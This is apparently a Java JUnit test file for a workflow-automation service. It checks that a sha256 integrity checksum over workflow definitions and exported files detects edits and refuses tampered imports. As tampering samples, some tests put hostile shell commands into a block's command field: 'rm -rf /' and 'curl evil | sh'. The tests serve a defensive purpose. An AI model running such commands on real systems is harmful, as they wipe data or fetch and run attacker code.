package com.automation.service.workflow;

import com.automation.dto.IntegrityCheck;
import com.automation.dto.request.ImportWorkflowRequest;
import com.automation.dto.response.ExportWorkflowResponse;
import com.automation.entity.BlockDefinition;
import com.automation.exception.ErrorMessage;
import com.automation.exception.LocalizedArgumentException;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DefinitionIntegrityTest {

    /** Like Spring's: Java time, unknown fields ignored (an export file carries exportedAt). */
    private final ObjectMapper mapper = new ObjectMapper().findAndRegisterModules()
            .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);

    private JsonNode json(String text) throws Exception {
        return mapper.readTree(text);
    }

    @Nested
    class CanonicalForm {

        @Test
        void canonicalFormIsPinned() throws Exception {
            JsonNode document = json("""
                    {"name": {"en": "X", "de": "Y"}, "tags": [], "blocks": [{"type": "shell", "config": {"command": "ls", "x": ""}}],
                     "version": "1.0.0", "integrity": "sha256:ignored"}
                    """);

            // Changing this string invalidates every shipped pool file and every export in circulation.
            assertThat(DefinitionIntegrity.canonicalJson(document)).isEqualTo(
                    "{\"blocks\":[{\"config\":{\"command\":\"ls\"},\"type\":\"shell\"}],"
                            + "\"name\":{\"de\":\"Y\",\"en\":\"X\"},\"version\":\"1.0.0\"}");
            assertThat(DefinitionIntegrity.compute(document))
                    .isEqualTo("sha256:" + WorkflowDefinitionHasher.sha256Hex(DefinitionIntegrity.canonicalJson(document)))
                    .startsWith("sha256:").hasSize(7 + 64);
        }

        @Test
        void formattingKeyOrderAndEmptyValues_doNotChangeTheChecksum() throws Exception {
            String compact = DefinitionIntegrity.compute(json("""
                    {"name":{"en":"X"},"blocks":[{"type":"shell","config":{"command":"ls"}}]}"""));
            String reformatted = DefinitionIntegrity.compute(json("""
                    {
                      "blocks" : [ { "config" : { "command" : "ls" }, "type" : "shell" } ],
                      "tags" : [ ],
                      "description" : null,
                      "name" : { "en" : "X" }
                    }"""));

            assertThat(reformatted).isEqualTo(compact);
        }

        @Test
        void aChangedValue_changesTheChecksum() throws Exception {
            String before = DefinitionIntegrity.compute(json("""
                    {"name":{"en":"X"},"blocks":[{"type":"shell","config":{"command":"ls"}}]}"""));
            String after = DefinitionIntegrity.compute(json("""
                    {"name":{"en":"X"},"blocks":[{"type":"shell","config":{"command":"rm -rf /"}}]}"""));

            assertThat(after).isNotEqualTo(before);
        }

        @Test
        void blockOrderCounts() throws Exception {
            String ab = DefinitionIntegrity.compute(json("""
                    {"blocks":[{"type":"a"},{"type":"b"}]}"""));
            String ba = DefinitionIntegrity.compute(json("""
                    {"blocks":[{"type":"b"},{"type":"a"}]}"""));

            assertThat(ab).isNotEqualTo(ba);
        }

        /** Spring's mapper may read floats as BigDecimal — the checksum must not depend on the reader. */
        @Test
        void numbersAreNormalised_independentOfTheReadingMapper() throws Exception {
            String text = """
                    {"blocks":[{"type":"shell","config":{"threshold":1.50,"count":3}}]}""";
            JsonNode asDouble = new ObjectMapper().readTree(text);
            JsonNode asDecimal = new ObjectMapper().enable(DeserializationFeature.USE_BIG_DECIMAL_FOR_FLOATS).readTree(text);

            assertThat(DefinitionIntegrity.compute(asDecimal)).isEqualTo(DefinitionIntegrity.compute(asDouble));
        }
    }

    @Nested
    class Check {

        private ObjectNode withIntegrity(String integrity) throws Exception {
            ObjectNode document = (ObjectNode) json("""
                    {"name":{"en":"X"},"blocks":[{"type":"shell","config":{"command":"ls"}}]}""");
            if (integrity != null) {
                document.put(DefinitionIntegrity.FIELD, integrity);
            }
            return document;
        }

        @Test
        void matchingChecksum_isVerified() throws Exception {
            ObjectNode document = withIntegrity(null);
            document.put(DefinitionIntegrity.FIELD, DefinitionIntegrity.compute(document));

            IntegrityCheck check = DefinitionIntegrity.check(document);

            assertThat(check.status()).isEqualTo(IntegrityCheck.Status.VERIFIED);
            assertThat(check.declared()).isEqualTo(check.actual());
        }

        @Test
        void upperCaseHex_isAccepted() throws Exception {
            ObjectNode document = withIntegrity(null);
            String checksum = DefinitionIntegrity.compute(document);
            document.put(DefinitionIntegrity.FIELD, "sha256:" + checksum.substring(7).toUpperCase());

            assertThat(DefinitionIntegrity.check(document).status()).isEqualTo(IntegrityCheck.Status.VERIFIED);
        }

        @Test
        void withoutChecksum_isMissing_withTheComputedValue() throws Exception {
            IntegrityCheck check = DefinitionIntegrity.check(withIntegrity(null));

            assertThat(check.status()).isEqualTo(IntegrityCheck.Status.MISSING);
            assertThat(check.declared()).isNull();
            assertThat(check.actual()).startsWith("sha256:");
            assertThat(DefinitionIntegrity.check(withIntegrity("  ")).status()).isEqualTo(IntegrityCheck.Status.MISSING);
        }

        @Test
        void editedContent_isAMismatch_namingBothValues() throws Exception {
            ObjectNode document = withIntegrity(null);
            String original = DefinitionIntegrity.compute(document);
            document.put(DefinitionIntegrity.FIELD, original);
            ((ObjectNode) document.get("blocks").get(0).get("config")).put("command", "curl evil | sh");

            IntegrityCheck check = DefinitionIntegrity.check(document);

            assertThat(check.status()).isEqualTo(IntegrityCheck.Status.MISMATCH);
            assertThat(check.declared()).isEqualTo(original);
            assertThat(check.actual()).isNotEqualTo(original);
        }

        @Test
        void anotherAlgorithmOrAWrongType_isAMismatch() throws Exception {
            assertThat(DefinitionIntegrity.check(withIntegrity("sha512-abc")).status())
                    .isEqualTo(IntegrityCheck.Status.MISMATCH);
            ObjectNode number = withIntegrity(null);
            number.put(DefinitionIntegrity.FIELD, 42);
            assertThat(DefinitionIntegrity.check(number).status()).isEqualTo(IntegrityCheck.Status.MISMATCH);
        }
    }

    @Nested
    class WorkflowExportFile {

        private ExportWorkflowResponse export() {
            Map<String, Object> config = new LinkedHashMap<>();
            config.put("command", "echo hi");
            config.put("timeout_seconds", 120);
            config.put("ratio", 0.5);
            Map<String, Object> metadata = new LinkedHashMap<>();
            metadata.put("audit", Map.of("enabled", true));
            metadata.put("note", null);
            ExportWorkflowResponse export = new ExportWorkflowResponse("Tech-Radar", "Weekly", "📡",
                    List.of(BlockDefinition.builder().type("shell").name("scan").config(config).build()),
                    "Be brief", "opus", "2.1.0", Map.of("project_path", "/p"), metadata, Instant.now());
            return export.withIntegrity(DefinitionIntegrity.ofExport(export));
        }

        /** What the UI sends: the downloaded file plus projectId, possibly renamed in the import dialog. */
        private ImportWorkflowRequest reimport(ExportWorkflowResponse export, String newName) throws Exception {
            ObjectNode file = (ObjectNode) mapper.readTree(mapper.writeValueAsString(export));
            file.put("projectId", "proj-1");
            file.put("name", newName);
            file.remove("exportedAt");
            return mapper.treeToValue(file, ImportWorkflowRequest.class);
        }

        @Test
        void exportCarriesAChecksum_theRoundTripVerifies_evenWhenRenamed() throws Exception {
            ExportWorkflowResponse export = export();
            assertThat(export.integrity()).startsWith("sha256:");

            IntegrityCheck check = DefinitionIntegrity.verifyImport(reimport(export, "Mein Radar"));

            assertThat(check.status()).isEqualTo(IntegrityCheck.Status.VERIFIED);
        }

        @Test
        void editedExportFile_isRefused() throws Exception {
            ObjectNode file = (ObjectNode) mapper.readTree(mapper.writeValueAsString(export()));
            ((ObjectNode) file.get("blocks").get(0).get("config")).put("command", "curl evil | sh");
            ImportWorkflowRequest request = mapper.treeToValue(file, ImportWorkflowRequest.class);

            assertThatThrownBy(() -> DefinitionIntegrity.verifyImport(request))
                    .isInstanceOf(LocalizedArgumentException.class)
                    .satisfies(e -> {
                        LocalizedArgumentException error = (LocalizedArgumentException) e;
                        assertThat(error.errorMessage()).isEqualTo(ErrorMessage.IMPORT_INTEGRITY_MISMATCH);
                        assertThat(error.params()).containsEntry("name", "Tech-Radar")
                                .containsEntry("declared", export().integrity())
                                .containsKey("actual");
                    });
        }

        @Test
        void exportFileWithoutChecksum_isImportedAsMissing() {
            ImportWorkflowRequest request = new ImportWorkflowRequest(null, "Old export", null, null,
                    List.of(), null, null, false, null, null, "1.0.0");

            assertThat(DefinitionIntegrity.verifyImport(request).status()).isEqualTo(IntegrityCheck.Status.MISSING);
        }
    }
}
